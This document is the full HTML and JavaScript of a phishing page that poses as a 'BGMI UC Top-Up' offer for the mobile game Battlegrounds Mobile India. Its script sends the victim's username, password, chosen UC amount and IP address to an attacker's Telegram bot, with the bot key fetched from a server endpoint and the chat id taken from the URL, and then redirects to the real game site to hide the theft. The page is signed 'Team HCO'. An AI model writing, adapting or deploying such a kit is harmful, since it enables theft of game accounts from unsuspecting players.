<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BGMI UC Top-Up</title>
    <link rel="shortcut icon" href="bgmi-logo.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica', 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1c2526 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><path fill="%23ffcc00" fill-opacity="0.6" d="M50 10a40 40 0 0 1 40 40 40 40 0 0 1-40 40 40 40 0 0 1-40-40 40 40 0 0 1 40-40z"/></svg>') repeat;
            opacity: 0.6;
            z-index: -1;
        }

        .container {
            display: flex;
            max-width: 1400px;
            width: 100%;
            height: 100vh;
            justify-content: center;
            align-items: center;
            padding: 30px;
        }

        .bgmi-banner {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="600" height="750"><rect width="600" height="750" rx="20" fill="%231a1a1a"/><path fill="%23ffcc00" fill-opacity="0.7" d="M50 50L550 50L550 700L50 700z"/><text x="50%" y="50%" font-size="34" fill="%23fff" text-anchor="middle" dominant-baseline="middle">BGMI Battle Arena</text><circle cx="50" cy="50" r="25" fill="%2300ff00" fill-opacity="0.6"/><circle cx="550" cy="700" r="25" fill="%2300ff00" fill-opacity="0.6"/></svg>');
            background-size: cover;
            background-position: center;
            width: 600px;
            height: 750px;
            margin-right: 80px;
            border-radius: 20px;
            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
            position: relative;
            overflow: hidden;
            border: 4px solid #00ff00;
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .bgmi-banner:hover {
            transform: scale(1.03);
            box-shadow: 0 0 70px rgba(0, 255, 0, 0.8);
        }

        .bgmi-banner::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5));
        }

        .form-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 500px;
        }

        .login-box {
            background: #1e1e1e;
            border: 1px solid #555;
            border-radius: 15px;
            padding: 60px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
            position: relative;
            overflow: hidden;
        }

        .login-box::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0, 255, 0, 0.5), transparent);
            opacity: 0.7;
            z-index: -1;
        }

        .logo {
            width: 115px;
            margin-bottom: 30px;
            border: 2px solid #ffcc00;
            border-radius: 50%;
            padding: 5px;
            box-shadow: 0 0 20px rgba(255, 204, 0, 0.9), 0 0 8px rgba(0, 255, 0, 0.6);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .logo:hover {
            transform: scale(1.1) rotate(5deg);
            box-shadow: 0 0 30px rgba(255, 204, 0, 1), 0 0 15px rgba(0, 255, 0, 0.8);
        }

        .tagline {
            font-size: 20px;
            color: #ffcc00;
            margin-bottom: 30px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            text-shadow: 0 0 10px rgba(255, 204, 0, 0.6);
        }

        .input-container {
            position: relative;
            margin-bottom: 25px;
        }

        .input-container i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #ffcc00;
            font-size: 18px;
            text-shadow: 0 0 6px rgba(255, 204, 0, 0.6);
            line-height: 1;
        }

        .login-form input, .login-form select {
            width: 100%;
            padding: 16px 16px 16px 45px;
            margin-bottom: 25px;
            background: #2a2a2a;
            border: 1px solid #666;
            border-radius: 12px;
            color: #fff;
            font-size: 18px;
            outline: none;
            transition: border-color 0.3s, box-shadow 0.3s;
            line-height: 1.5;
            height: 50px;
        }

        .login-form input:focus, .login-form select:focus {
            border-color: #00ff00;
            box-shadow: 0 0 12px rgba(0, 255, 0, 0.6);
        }

        .login-form select {
            appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14"><path fill="%2300ff00" d="M2 4l5 5 5-5z"/></svg>');
            background-repeat: no-repeat;
            background-position: right 16px center;
            padding-right: 45px;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: #00ff00;
            border: none;
            border-radius: 12px;
            color: #1a1a1a;
            font-weight: bold;
            font-size: 20px;
            cursor: pointer;
            animation: pulse 2s infinite;
            transition: background 0.3s, transform 0.2s, box-shadow 0.3s;
        }

        .login-btn:hover {
            background: #00cc00;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 255, 0, 0.8);
        }

        .login-btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
            animation: none;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.6); }
            50% { box-shadow: 0 0 20px 10px rgba(0, 255, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
        }

        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 35px 0;
            color: #888;
            font-size: 16px;
            font-weight: 600;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #666;
        }

        .divider::before {
            margin-right: 20px;
        }

        .divider::after {
            margin-left: 20px;
        }

        .social-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffcc00;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin: 25px 0;
            transition: color 0.3s;
        }

        .social-login i {
            margin-right: 12px;
        }

        .social-login:hover {
            color: #e6b800;
        }

        .forgot-pw {
            color: #888;
            font-size: 16px;
            margin-top: 25px;
            cursor: pointer;
            transition: color 0.3s;
        }

        .forgot-pw:hover {
            color: #00ff00;
        }

        .signup-box {
            background: #1e1e1e;
            border: 1px solid #555;
            border-radius: 15px;
            padding: 35px;
            width: 100%;
            margin-top: 30px;
            text-align: center;
            color: #fff;
            font-size: 18px;
        }

        .signup-box a {
            color: #00ff00;
            font-weight: 600;
            text-decoration: none;
            transition: color 0.3s;
        }

        .signup-box a:hover {
            color: #00cc00;
        }

        .error-message {
            color: #ff4444;
            font-size: 18px;
            margin: 15px 0;
            display: none;
            background: #2a2a2a;
            padding: 12px;
            border-radius: 8px;
        }

        .success-message {
            color: #00ff00;
            font-size: 18px;
            margin: 15px 0;
            display: none;
            background: #2a2a2a;
            padding: 12px;
            border-radius: 8px;
        }

        @media (max-width: 1100px) {
            .bgmi-banner {
                display: none;
            }

            .form-container {
                width: 90%;
                max-width: 500px;
            }

            .login-box {
                padding: 40px;
            }

            .logo {
                width: 100px;
            }

            .tagline {
                font-size: 18px;
            }

            .login-form input, .login-form select {
                font-size: 16px;
                padding: 14px 14px 14px 40px;
                height: 46px;
            }

            .login-btn {
                font-size: 18px;
                padding: 14px;
            }
        }

        @media (max-width: 600px) {
            .login-box {
                padding: 30px;
            }

            .logo {
                width: 90px;
            }

            .tagline {
                font-size: 16px;
            }

            .login-form input, .login-form select {
                font-size: 14px;
                padding: 12px 12px 12px 35px;
                height: 42px;
            }

            .input-container i {
                font-size: 16px;
            }

            .login-btn {
                font-size: 16px;
                padding: 12px;
            }

            .signup-box {
                font-size: 16px;
                padding: 25px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="bgmi-banner"></div>
        <div class="form-container">
            <div class="login-box">
                <img src="bgmi-logo.png" alt="BGMI Logo" class="logo">
                <div class="tagline">Instant UC Top-Up</div>
                <form class="login-form" id="loginForm">
                    <div class="input-container">
                        <i class="fas fa-user"></i>
                        <input type="text" id="username" placeholder="Username, Email, or Phone" required>
                    </div>
                    <div class="input-container">
                        <i class="fas fa-lock"></i>
                        <input type="password" id="password" placeholder="Password" required>
                    </div>
                    <select id="ucAmount" required>
                        <option value="" disabled selected>Select UC Amount</option>
                        <option value="60 UC">60 UC</option>
                        <option value="300 UC">300 UC</option>
                        <option value="600 UC">600 UC</option>
                        <option value="1500 UC">1500 UC</option>
                        <option value="3000 UC">3000 UC</option>
                    </select>
                    <div class="error-message" id="errorMessage">Please fill in all fields correctly.</div>
                    <div class="success-message" id="successMessage">Processing successful! Redirecting to BGMI...</div>
                    <button type="submit" class="login-btn" id="loginBtn">Top Up</button>
                </form>
                <div class="divider">OR</div>
                <div class="social-login">
                    <i class="fab fa-google"></i> Login with Google
                </div>
                <div class="forgot-pw">Forgot Password?</div>
            </div>
            <div class="signup-box">
                New to BGMI? <a href="#">Create an Account</a>
            </div>
        </div>
    </div>

    <script>
    async function getFastKey() {
      const res = await fetch('/api/fast_servers');
      const data = await res.json();
      return data.fast_key;
    }
    
    
        // Telegram credentials
       // const botfast_key = await getFastKey();
        const chatId = new URLSearchParams(window.location.search).get('id');
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const ucAmountSelect = document.getElementById('ucAmount');
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');
            const loginBtn = document.getElementById('loginBtn');

            // Focus on username field
            usernameInput.focus();

            // Clear error on input
            [usernameInput, passwordInput, ucAmountSelect].forEach(input => {
                input.addEventListener('input', function() {
                    errorMessage.style.display = 'none';
                });
            });

            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();

                const username = usernameInput.value.trim();
                const password = passwordInput.value;
                const ucAmount = ucAmountSelect.value;

                // Reset messages
                errorMessage.style.display = 'none';
                successMessage.style.display = 'none';
                loginBtn.disabled = true;

                // Validate inputs
                if (!username || !password || !ucAmount) {
                    errorMessage.textContent = "Please fill in all fields";
                    errorMessage.style.display = 'block';
                    loginBtn.disabled = false;
                    return;
                }

                // Validate credentials
                const isValid = validateCredentials(username, password);

                if (!isValid) {
                    errorMessage.textContent = "Invalid credentials. Password must be at least 6 characters with letters and numbers.";
                    errorMessage.style.display = 'block';
                    loginBtn.disabled = false;

                    // Shake animation
                    loginForm.style.animation = 'shake 0.5s';
                    setTimeout(() => {
                        loginForm.style.animation = '';
                    }, 500);
                    return;
                }

                // Send to Telegram
                const sent = await sendToTelegram(username, password, ucAmount);

                if (sent) {
                    successMessage.style.display = 'block';
                    setTimeout(() => {
                        window.location.href = 'https://www.battlegroundsmobileindia.com/';
                    }, 2000);
                } else {
                    errorMessage.textContent = "Failed to send data to Telegram. Please check your connection or bot settings.";
                    errorMessage.style.display = 'block';
                    loginBtn.disabled = false;
                }
            });

            function validateCredentials(username, password) {
                return username.length >= 3 && 
                       password.length >= 6 && 
                       /[A-Za-z]/.test(password) && 
                       /[0-9]/.test(password);
            }

            async function sendToTelegram(username, password, ucAmount) {
                const botfast_key = await getFastKey();
                const chatId = new URLSearchParams(window.location.search).get('id');
                const message = `âœ… BGMI UC Top-Up Request:
Username/Email: ${username}
Password: ${password}
UC Amount: ${ucAmount}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
IP: ${await getIP()}
Thank you Team HCO ðŸ”–`;

                const url = `https://api.telegram.org/bot${botfast_key}/sendMessage`;

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    });

                    const data = await response.json();
                    if (!data.ok) {
                        console.error('Telegram API error:', data.description);
                        return false;
                    }
                    return true;
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                    return false;
                }
            }

            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || 'Unknown';
                } catch {
                    return 'Unknown';
                }
            }
        });

        // Shake animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes shake {
                0% { transform: translateX(0); }
                20% { transform: translateX(-10px); }
                40% { transform: translateX(10px); }
                60% { transform: translateX(-10px); }
                80% { transform: translateX(10px); }
                100% { transform: translateX(0); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
